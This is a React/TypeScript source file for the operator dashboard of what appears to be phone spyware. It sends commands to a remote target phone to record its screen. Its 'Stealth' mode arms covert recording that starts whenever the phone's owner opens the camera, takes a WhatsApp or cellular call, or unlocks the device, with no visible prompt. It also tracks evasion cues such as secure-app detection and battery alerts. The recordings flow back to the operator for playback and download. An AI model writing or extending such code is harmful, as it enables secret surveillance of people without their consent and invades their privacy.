"use client";

import React, { useState, useEffect, useRef } from 'react';
import {
    Video, Square, Play, Clock, Download, Trash2,
    AlertTriangle, CheckCircle2, AlertCircle, X,
    Zap, Shield, Infinity
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
    mode?: string;
}

// Duration options (seconds). -1 = unlimited (until token killed)
const DURATION_OPTIONS = [
    { label: '2 min',  value: 120 },
    { label: '5 min',  value: 300 },
    { label: '10 min', value: 600 },
];

function fmtMs(ms: number) {
    const s  = Math.floor(ms / 1000);
    const m  = Math.floor(s / 60);
    const ss = (s % 60).toString().padStart(2, '0');
    return `${m}:${ss}`;
}

function fmtSec(sec: number) {
    if (sec <= 0) return '∞';
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return s > 0 ? `${m}m ${s}s` : `${m}m`;
}

function fmtReason(r: string) {
    if (r === 'duration_complete')     return 'Completed';
    if (r === 'manual_stop')           return 'Stopped';
    if (r === 'secure_app_detected')   return 'Auto-stopped';
    if (r === 'encoder_error')         return 'Encoder error';
    if (r === 'token_released')        return 'Token released';
    if (r === 'stealth_timeout')       return 'Timeout';
    return r;
}

export default function ScreenRecordView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    deviceName
}: ScreenRecordViewProps) {

    // ── Token & device state ───────────────────────────────────────────────────
    const [hasToken,    setHasToken]    = useState<boolean | null>(null);
    const [statusMsg,   setStatusMsg]   = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);

    // ── Recording state ────────────────────────────────────────────────────────
    const [isRecording,  setIsRecording]  = useState(false);
    const [recMode,      setRecMode]      = useState<'stealth' | 'simple'>('stealth');
    const [recDuration,  setRecDuration]  = useState(300);         // seconds, -1 = unlimited
    const [customMin,    setCustomMin]    = useState('');           // custom input string
    const [showCustom,   setShowCustom]   = useState(false);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs,   setRecTotalMs]   = useState(0);
    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
    const [pendingRec,   setPendingRec]   = useState(false);        // waiting for trigger/permission

    // ── Modals ─────────────────────────────────────────────────────────────────
    const [showSimpleWarn,  setShowSimpleWarn]  = useState(false);  // simple mode popup warning
    const [showUnlimWarn,   setShowUnlimWarn]   = useState(false);  // unlimited mode warning

    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;

    // ── Socket events ─────────────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;

        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        }

        const onScreenStatus = (data: any) => {
            if (!data) return;
            if (data.hasToken !== undefined) setHasToken(!!data.hasToken);

            switch (data.status) {
                case 'token_needed':
                    setHasToken(false);
                    setPendingRec(true);
                    setStatusMsg({ type: 'warning', text: 'Waiting for permission on phone...' });
                    break;
                case 'authorized':
                    setHasToken(true);
                    setStatusMsg({ type: 'success', text: 'Screen capture ready.' });
                    break;
                case 'recording_started':
                    setIsRecording(true);
                    setPendingRec(false);
                    setRecElapsedMs(0);
                    setRecTotalMs((data.durationSec || 0) * 1000);
                    setStatusMsg(null);
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false);
                    setIsRecording(false);
                    setPendingRec(false);
                    if (data.reason === 'device_stopped') {
                        setStatusMsg({ type: 'warning', text: 'Screen capture stopped on device.' });
                    }
                    break;
                case 'stealth_timeout':
                    setPendingRec(false);
                    setStatusMsg({ type: 'warning', text: 'Stealth timeout — no trigger detected in 30 min.' });
                    break;
                case 'denied':
                    setIsRecording(false);
                    setPendingRec(false);
                    setHasToken(false);
                    setStatusMsg({ type: 'error', text: data.error || 'Permission denied on device.' });
                    break;
                default:
                    if (data.error) setStatusMsg({ type: 'error', text: data.error });
            }
        };

        const onRecProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true);
            setPendingRec(false);
            setRecElapsedMs(data.elapsedMs || 0);
            setRecTotalMs(data.totalMs || 0);
        };

        const onRecComplete = (data: any) => {
            if (!data) return;
            setIsRecording(false);
            setPendingRec(false);
            setRecElapsedMs(0);
            setHasToken(false); // stealth kills token; simple might too

            if (data.url) {
                const rec: SavedRecording = {
                    id:        `rec_${Date.now()}`,
                    url:       data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs || 0,
                    totalMs:   data.totalMs   || 0,
                    reason:    data.reason    || 'unknown',
                    mode:      data.mode
                };
                setSavedRecs(prev => [rec, ...prev.slice(0, 19)]);
                setStatusMsg({ type: 'success', text: `Recording saved — ${fmtMs(data.elapsedMs || 0)}` });
            } else {
                setStatusMsg({ type: 'warning', text: `Recording ended: ${fmtReason(data.reason || 'unknown')}` });
            }
        };

        socket.on('screen_status',       onScreenStatus);
        socket.on('screen_rec_progress', onRecProgress);
        socket.on('screen_rec_complete', onRecComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_status',       onScreenStatus);
            socket.off('screen_rec_progress', onRecProgress);
            socket.off('screen_rec_complete', onRecComplete);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid]);

    // Auto-clear success messages
    useEffect(() => {
        if (!statusMsg || statusMsg.type === 'warning' || statusMsg.type === 'error') return;
        const t = setTimeout(() => setStatusMsg(null), 5000);
        return () => clearTimeout(t);
    }, [statusMsg]);

    // ── Actions ────────────────────────────────────────────────────────────────

    const handleStartRecord = () => {
        if (!selectedDeviceId || !isOnline || !socket || isRecording || pendingRec) return;

        // Simple mode warning: dialog will appear on phone
        if (recMode === 'simple') {
            setShowSimpleWarn(true);
            return;
        }

        // Unlimited mode extra warning
        if (recDuration === -1 && recMode === 'stealth') {
            setShowUnlimWarn(true);
            return;
        }

        fireStartRecord();
    };

    const fireStartRecord = () => {
        if (!selectedDeviceId || !socket) return;
        const duration = recDuration === -1 ? 86400 : recDuration; // 24h cap for "unlimited"
        setPendingRec(true);
        setRecElapsedMs(0);
        setRecTotalMs(duration * 1000);
        socket.emit('screen_record_start', {
            uuid:           userUuid,
            targetDeviceId: selectedDeviceId,
            duration,
            mode:           recMode
        });
        if (recMode === 'stealth') {
            setStatusMsg({ type: 'info', text: 'Stealth armed — recording starts on camera open or call.' });
        } else {
            setStatusMsg({ type: 'info', text: 'Permission prompt sent to phone...' });
        }
    };

    const handleStopRecord = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        setIsRecording(false);
        setPendingRec(false);
    };

    const handleCustomInput = (val: string) => {
        setCustomMin(val);
        const n = parseInt(val, 10);
        if (!isNaN(n) && n >= 1 && n <= 10) {
            setRecDuration(n * 60);
        }
    };

    const progressPct = recTotalMs > 0
        ? Math.min((recElapsedMs / recTotalMs) * 100, 100)
        : 0;

    const isUnlimited = recDuration === -1;

    // ── Render ─────────────────────────────────────────────────────────────────
    return (
        <div className="w-full max-w-lg mx-auto space-y-3 pb-24 px-3 sm:px-0 animate-in fade-in duration-300">

            {/* ── Status Banner ──────────────────────────────────────────────── */}
            {statusMsg && (
                <div className={`px-4 py-2.5 rounded-2xl text-xs font-mono flex items-center justify-between gap-3 border shadow-md animate-in slide-in-from-top-2 ${
                    statusMsg.type === 'warning' ? 'bg-amber-500/10 text-amber-300 border-amber-500/30'
                  : statusMsg.type === 'error'   ? 'bg-rose-500/10  text-rose-300  border-rose-500/30'
                  : statusMsg.type === 'success' ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
                  :                                'bg-violet-500/10 text-violet-300 border-violet-500/30'
                }`}>
                    <div className="flex items-center gap-2">
                        {statusMsg.type === 'success'
                            ? <CheckCircle2 size={14} />
                            : <AlertCircle size={14} />
                        }
                        <span>{statusMsg.text}</span>
                    </div>
                    <button onClick={() => setStatusMsg(null)} className="text-white/40 hover:text-white cursor-pointer px-1">✕</button>
                </div>
            )}

            {/* ── Token Status Strip ─────────────────────────────────────────── */}
            <div className="clay-card px-4 py-2.5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                    <span className={`w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-400 shadow-[0_0_6px_#34d399]' : 'bg-rose-500'}`} />
                    <span className="text-xs font-mono text-white/50">{deviceName || 'No device'}</span>
                </div>
                {hasToken !== null && (
                    <span className={`text-[10px] font-mono font-bold px-2.5 py-1 rounded-full ${
                        hasToken ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/25'
                                 : 'bg-white/5 text-white/30 border border-white/10'
                    }`}>
                        {hasToken ? '● Token Active' : '○ No Token'}
                    </span>
                )}
            </div>

            {/* ── Mode Selector ──────────────────────────────────────────────── */}
            <div className="clay-card p-3 space-y-3">
                <span className="text-[10px] font-bold uppercase tracking-widest text-white/30 px-1">Mode</span>
                <div className="grid grid-cols-2 gap-2">
                    {/* Stealth */}
                    <button
                        onClick={() => setRecMode('stealth')}
                        disabled={isRecording || pendingRec}
                        className={`p-3 rounded-xl text-left transition-all cursor-pointer disabled:opacity-40 border ${
                            recMode === 'stealth'
                                ? 'bg-violet-500/15 border-violet-500/50 shadow-[0_0_20px_rgba(139,92,246,0.15)]'
                                : 'bg-white/3 border-white/8 hover:border-white/15'
                        }`}
                    >
                        <div className="flex items-center gap-1.5 mb-1">
                            <Shield size={13} className={recMode === 'stealth' ? 'text-violet-400' : 'text-white/30'} />
                            <span className={`text-xs font-black uppercase tracking-wider ${recMode === 'stealth' ? 'text-violet-300' : 'text-white/50'}`}>
                                Stealth
                            </span>
                        </div>
                        <p className="text-[10px] text-white/35 leading-relaxed">
                            Triggers on camera open or call — no visible prompt
                        </p>
                    </button>

                    {/* Simple */}
                    <button
                        onClick={() => setRecMode('simple')}
                        disabled={isRecording || pendingRec}
                        className={`p-3 rounded-xl text-left transition-all cursor-pointer disabled:opacity-40 border ${
                            recMode === 'simple'
                                ? 'bg-blue-500/15 border-blue-500/50 shadow-[0_0_20px_rgba(59,130,246,0.15)]'
                                : 'bg-white/3 border-white/8 hover:border-white/15'
                        }`}
                    >
                        <div className="flex items-center gap-1.5 mb-1">
                            <Zap size={13} className={recMode === 'simple' ? 'text-blue-400' : 'text-white/30'} />
                            <span className={`text-xs font-black uppercase tracking-wider ${recMode === 'simple' ? 'text-blue-300' : 'text-white/50'}`}>
                                Simple
                            </span>
                        </div>
                        <p className="text-[10px] text-white/35 leading-relaxed">
                            Immediate permission prompt on phone screen
                        </p>
                    </button>
                </div>
            </div>

            {/* ── Duration Selector ──────────────────────────────────────────── */}
            <div className="clay-card p-3 space-y-2.5">
                <span className="text-[10px] font-bold uppercase tracking-widest text-white/30 px-1">Duration</span>

                {/* Preset pills */}
                <div className="flex items-center gap-2">
                    {DURATION_OPTIONS.map(opt => (
                        <button
                            key={opt.value}
                            onClick={() => { setRecDuration(opt.value); setShowCustom(false); setCustomMin(''); }}
                            disabled={isRecording || pendingRec}
                            className={`flex-1 py-2 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer disabled:opacity-40 ${
                                recDuration === opt.value && !showCustom && recDuration !== -1
                                    ? 'bg-violet-600 text-white shadow-[0_0_12px_rgba(139,92,246,0.35)]'
                                    : 'bg-white/8 text-white/50 hover:text-white/80 hover:bg-white/12'
                            }`}
                        >
                            {opt.label}
                        </button>
                    ))}

                    {/* Custom pill */}
                    <button
                        onClick={() => { setShowCustom(true); setRecDuration(0); }}
                        disabled={isRecording || pendingRec}
                        className={`flex-1 py-2 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer disabled:opacity-40 ${
                            showCustom
                                ? 'bg-violet-600 text-white shadow-[0_0_12px_rgba(139,92,246,0.35)]'
                                : 'bg-white/8 text-white/50 hover:text-white/80 hover:bg-white/12'
                        }`}
                    >
                        Custom
                    </button>
                </div>

                {/* Custom input */}
                {showCustom && (
                    <div className="flex items-center gap-2 bg-[#07090e] rounded-xl px-3 py-2 border border-violet-500/30 animate-in slide-in-from-top-1">
                        <input
                            type="number"
                            min={1}
                            max={10}
                            value={customMin}
                            onChange={e => handleCustomInput(e.target.value)}
                            placeholder="1–10"
                            className="bg-transparent text-white text-sm font-mono w-16 outline-none placeholder:text-white/20"
                        />
                        <span className="text-xs text-white/30 font-mono">minutes (max 10)</span>
                        {recDuration > 0 && (
                            <span className="ml-auto text-xs text-violet-400 font-mono font-bold">{fmtSec(recDuration)}</span>
                        )}
                    </div>
                )}

                {/* Unlimited option */}
                <button
                    onClick={() => { setRecDuration(-1); setShowCustom(false); setCustomMin(''); }}
                    disabled={isRecording || pendingRec}
                    className={`w-full py-2.5 rounded-xl text-xs font-bold font-mono flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-40 border ${
                        isUnlimited
                            ? 'bg-amber-500/15 border-amber-500/40 text-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.15)]'
                            : 'bg-white/3 border-white/8 text-white/35 hover:border-white/15 hover:text-white/60'
                    }`}
                >
                    <Infinity size={13} />
                    <span>Until token killed</span>
                    {isUnlimited && <span className="text-[10px] text-amber-400/70 ml-1">⚠ risky on some devices</span>}
                </button>
            </div>

            {/* ── Record Button / Status ─────────────────────────────────────── */}
            <div className="clay-card p-3 space-y-3">
                {!isRecording && !pendingRec ? (
                    <button
                        onClick={handleStartRecord}
                        disabled={!isOnline || !selectedDeviceId || (showCustom && recDuration <= 0)}
                        className={`w-full py-3.5 rounded-xl font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg disabled:opacity-40 disabled:cursor-not-allowed ${
                            recMode === 'stealth'
                                ? 'bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-500 hover:to-purple-500 text-white shadow-[0_4px_20px_rgba(139,92,246,0.4)]'
                                : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white shadow-[0_4px_20px_rgba(59,130,246,0.4)]'
                        }`}
                    >
                        <Play size={14} className="fill-current" />
                        {recMode === 'stealth' ? 'Arm Stealth Record' : 'Start Recording'}
                    </button>

                ) : pendingRec && !isRecording ? (
                    /* Waiting state */
                    <div className="space-y-2">
                        <div className="w-full py-3 rounded-xl flex items-center justify-center gap-2 text-xs font-mono bg-amber-500/10 border border-amber-500/25 text-amber-300">
                            <Clock size={14} className="animate-spin" />
                            {recMode === 'stealth' ? 'Triggers armed — waiting...' : 'Waiting for permission...'}
                        </div>
                        <button
                            onClick={handleStopRecord}
                            className="w-full py-2 rounded-xl text-xs font-mono text-white/40 hover:text-rose-400 hover:bg-rose-500/10 transition-all cursor-pointer border border-white/8"
                        >
                            Cancel
                        </button>
                    </div>

                ) : (
                    /* Recording in progress */
                    <div className="space-y-3">
                        <div className="flex items-center justify-between text-xs">
                            <div className="flex items-center gap-2 text-rose-400">
                                <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]" />
                                <span className="font-black uppercase tracking-wider">Recording</span>
                            </div>
                            <span className="font-mono text-white/60">
                                {fmtMs(recElapsedMs)} {recTotalMs > 0 && !isUnlimited ? `/ ${fmtMs(recTotalMs)}` : ''}
                            </span>
                        </div>

                        {!isUnlimited && recTotalMs > 0 && (
                            <div className="h-1.5 rounded-full bg-white/8 overflow-hidden">
                                <div
                                    className="h-full rounded-full bg-gradient-to-r from-rose-500 to-orange-400 transition-all duration-1000"
                                    style={{ width: `${progressPct}%` }}
                                />
                            </div>
                        )}

                        <button
                            onClick={handleStopRecord}
                            className="w-full py-2.5 rounded-xl text-xs font-bold font-mono flex items-center justify-center gap-2 bg-rose-500/15 border border-rose-500/30 text-rose-400 hover:bg-rose-500/25 transition-all cursor-pointer"
                        >
                            <Square size={12} className="fill-current" />
                            Stop Recording
                        </button>
                    </div>
                )}
            </div>

            {/* ── Stealth Info Block (only in stealth mode, not recording) ──── */}
            {recMode === 'stealth' && !isRecording && !pendingRec && (
                <div className="clay-card p-3 space-y-2 border border-violet-500/15">
                    <div className="flex items-center gap-2 text-[10px] font-bold uppercase tracking-widest text-violet-400/70">
                        <Shield size={11} />
                        <span>How stealth works</span>
                    </div>
                    <div className="space-y-1.5 text-[11px] text-white/35 font-mono leading-relaxed">
                        <div className="flex items-start gap-2">
                            <span className="text-violet-500 mt-0.5">→</span>
                            <span>Camera open on phone → recording starts</span>
                        </div>
                        <div className="flex items-start gap-2">
                            <span className="text-violet-500 mt-0.5">→</span>
                            <span>Any call (WhatsApp / cellular) → recording starts</span>
                        </div>
                        <div className="flex items-start gap-2">
                            <span className="text-violet-500 mt-0.5">→</span>
                            <span>After 12h, phone unlock → recording starts</span>
                        </div>
                        <div className="flex items-start gap-2">
                            <span className="text-amber-500/70 mt-0.5">!</span>
                            <span className="text-white/25">Recordings appear below automatically — no action needed</span>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Saved Recordings ───────────────────────────────────────────── */}
            {savedRecs.length > 0 && (
                <div className="clay-card overflow-hidden">
                    <div className="px-4 py-2.5 border-b border-white/5 flex items-center justify-between">
                        <div className="flex items-center gap-2 text-[11px] font-bold uppercase tracking-wider text-white/40">
                            <Video size={13} />
                            <span>Recordings ({savedRecs.length})</span>
                        </div>
                        <button
                            onClick={() => setSavedRecs([])}
                            className="text-[10px] font-mono text-white/20 hover:text-rose-400 transition-colors cursor-pointer"
                        >
                            Clear
                        </button>
                    </div>
                    <div className="divide-y divide-white/4">
                        {savedRecs.map(rec => (
                            <div key={rec.id} className="flex items-center gap-3 px-4 py-3 hover:bg-white/3 transition-colors">
                                <div className={`w-8 h-8 rounded-xl flex items-center justify-center shrink-0 ${
                                    rec.mode === 'stealth'
                                        ? 'bg-violet-500/15 text-violet-400'
                                        : 'bg-blue-500/15 text-blue-400'
                                }`}>
                                    <Video size={14} />
                                </div>
                                <div className="flex-1 min-w-0">
                                    <div className="text-xs font-bold text-white/80 font-mono">
                                        {fmtMs(rec.elapsedMs)}
                                        <span className={`ml-2 text-[10px] px-1.5 py-0.5 rounded-md ${
                                            rec.mode === 'stealth'
                                                ? 'bg-violet-500/15 text-violet-400'
                                                : 'bg-blue-500/15 text-blue-400'
                                        }`}>
                                            {rec.mode || 'rec'}
                                        </span>
                                    </div>
                                    <div className="text-[10px] text-white/30 font-mono mt-0.5">
                                        {new Date(rec.timestamp).toLocaleTimeString()} · {fmtReason(rec.reason)}
                                    </div>
                                </div>
                                <div className="flex items-center gap-1.5 shrink-0">
                                    <a
                                        href={rec.url}
                                        target="_blank"
                                        rel="noopener noreferrer"
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white/50 hover:text-white transition-all"
                                        title="Play"
                                    >
                                        <Play size={12} />
                                    </a>
                                    <a
                                        href={rec.url}
                                        download
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white/50 hover:text-white transition-all"
                                        title="Download"
                                    >
                                        <Download size={12} />
                                    </a>
                                    <button
                                        onClick={() => setSavedRecs(prev => prev.filter(r => r.id !== rec.id))}
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-rose-500/20 text-white/30 hover:text-rose-400 transition-all cursor-pointer"
                                        title="Remove"
                                    >
                                        <Trash2 size={12} />
                                    </button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* ── Simple Mode Warning Modal ──────────────────────────────────── */}
            {showSimpleWarn && (
                <div className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
                    <div className="clay-card max-w-sm w-full p-5 border border-amber-500/35 shadow-2xl space-y-4 animate-in slide-in-from-bottom-4 sm:slide-in-from-bottom-0">
                        <div className="flex items-center gap-2.5 text-amber-400">
                            <AlertTriangle size={18} />
                            <span className="font-black text-sm uppercase tracking-wider">Permission Prompt</span>
                        </div>
                        <p className="text-xs text-white/60 font-mono leading-relaxed">
                            This will immediately show a <span className="text-white font-bold">"Start now?"</span> dialog on the phone screen. The user will see it.
                        </p>
                        <div className="flex gap-2 pt-1">
                            <button
                                onClick={() => setShowSimpleWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-mono text-white/50 hover:text-white border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={() => { setShowSimpleWarn(false); fireStartRecord(); }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-amber-500 hover:bg-amber-400 text-black transition-all cursor-pointer"
                            >
                                Send Prompt
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Unlimited Duration Warning Modal ──────────────────────────── */}
            {showUnlimWarn && (
                <div className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
                    <div className="clay-card max-w-sm w-full p-5 border border-rose-500/35 shadow-2xl space-y-4 animate-in slide-in-from-bottom-4 sm:slide-in-from-bottom-0">
                        <div className="flex items-center gap-2.5 text-rose-400">
                            <AlertTriangle size={18} />
                            <span className="font-black text-sm uppercase tracking-wider">Unlimited Recording</span>
                        </div>
                        <p className="text-xs text-white/60 font-mono leading-relaxed">
                            Recording will run until the token is manually killed or the app is detected. Long recordings may trigger battery alerts on some devices.
                        </p>
                        <div className="flex gap-2 pt-1">
                            <button
                                onClick={() => setShowUnlimWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-mono text-white/50 hover:text-white border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={() => { setShowUnlimWarn(false); fireStartRecord(); }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-rose-500 hover:bg-rose-400 text-white transition-all cursor-pointer"
                            >
                                Arm Anyway
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
